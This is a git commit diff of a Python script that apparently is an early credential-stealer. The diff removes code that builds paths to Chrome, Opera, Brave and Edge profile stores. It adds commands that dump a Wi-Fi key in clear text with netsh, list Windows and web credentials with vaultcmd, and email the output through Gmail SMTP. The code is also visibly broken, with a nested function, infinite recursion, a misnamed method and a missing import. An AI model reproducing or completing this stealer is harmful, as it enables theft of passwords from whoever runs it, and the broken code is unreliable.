7554cbdd404cc49f2c3738596a5176d6e0d0cf41
Justin Avina <jt.avina@icloud.com>
2022-05-04 10:12:49 -0700

    Added Subprocessing and SMTP mail service to send directy to the user.

--- New.py
+++ New.py
@@ -1,65 +1,33 @@
-import requests
 import os
 import subprocess
-import pyautogui
-import cV2
 import smtplib
-# import socket
-# import sqlite3
-# import win32crypt
-# import math
-# import datetime
-# import json
-# import platform
-# import psutil
-# import GPUtil
-# import re
-# import pandas
-# import shutil
-# import zipfile
 
 def GetPath():
     print("Getting Current working directory...")
     print(os.getcwd())
     print()
 
-def GetCreds():
-    local = getenv('LOCALAPPDATA')
-    roaming = getenv('APPDATA')
+    def SendMail(email, password, message):
 
-    paths = {
+        # email = input("What is your email?>")
+        # password = input("What is your Passoword for your email?>")
 
-    'Google Chrome': local + '\\Google\\User Data\\Default',
-    'Opera': roaming +  '\\Opera Software\\Opera Stable',
-    'Opera GX': roaming + '\\Opera GX Software\\Opera GX Stable',
-    'Brave': local + '\\Brave Software\\Brave-Browser\\User Data\\Default'
-    'Edge': local + '\\Microsoft\\Edge\\User Data\\Default'
+        WifiPass = "netsh wlan show profiles " + "WifiNetwork" + " key=clear"
 
-    }
-
-    def SendMail():
-
-        email = input("What is your email>")
-        password = input("What is your password>")
+        result = subprocess.check_output(WifiPass, shell=True)
+        print(result)
 
         server = smtplib.SMTP("smtp.gmail.com", 587)
         server.starttls()
         server.login(email, password)
         server.SendMail(email, email, message)
         server.quit()
+        SendMail(email, password, result)
 
+        return SendMail(email, password, message)
 
-command1 = "vaultcmd /listcreds:'Web Credentials' /all";
-command2 = "vaultcmd /listcreds:'Windows Credentials' /all";
+Web_Creds = "vaultcmd /listcreds:'Web Credentials' /all"
+Win_Creds = "vaultcmd /listcreds:'Windows Credentials' /all"
 
-WifiName = input("Whats your Wifi Name? >")
-WifiPass = "netsh wlan show profile " + WifiName + " key=clear"
-
-result1 =subprocess.check_output(WifiName, shell=True)
-reult2 = subprocess.check_output(WifiPass, shell=True)
-
-SendMail(email, password, result1)
-SendMail(email, password, result2)
-
-subprocess.Popen(command1, shell=True)
-subprocess.Popen(command2, shell=True)
+print([Web_Creds, Win_Creds])
+subprocess.check_output([Web_Creds, Win_Creds])
